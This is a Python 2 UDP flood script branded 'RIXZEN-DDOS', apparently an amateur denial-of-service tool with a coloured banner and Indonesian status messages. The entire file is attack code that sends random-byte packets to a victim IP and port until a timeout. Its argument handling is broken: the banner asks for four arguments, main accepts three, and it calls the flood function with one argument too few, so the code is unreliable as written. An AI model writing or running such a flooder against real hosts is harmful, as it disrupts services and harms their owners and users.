import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#######################################################################"
    print "#----------------------------[\033[1;91mRIXZEN-DDOS\033[1;32m]----------------------------#"
    print "#   \033[1;91mCommand: " "python2 RixzenDDoS.py " "<ip> <port> <packet> <duration>\033[1;32m    #"
    print "#                                                                    ##"
    print "#\033[1;91mCreator: MrNath     \033[1;32m##     #      #                                 ##"
    print "#\033[1;91mTeam   : MCI        \033[1;32m##     #      #                                 ##"
    print "#\033[1;91mVersion: 1.0        \033[1;32m##     #      #                                 ##"
    print "#\033[1;91mTQAdmin: MrNath, MrTod, MrPrek                                      \033[1;32m##"
    print "#######################################################################"
def flood(victim, vport, packets, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packets)
    timeout =  time.time() + duration
    sent = 25000
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
            client.sendto(bytes, (victim, vport))
            sent = sent + 1
            print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke ip: \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()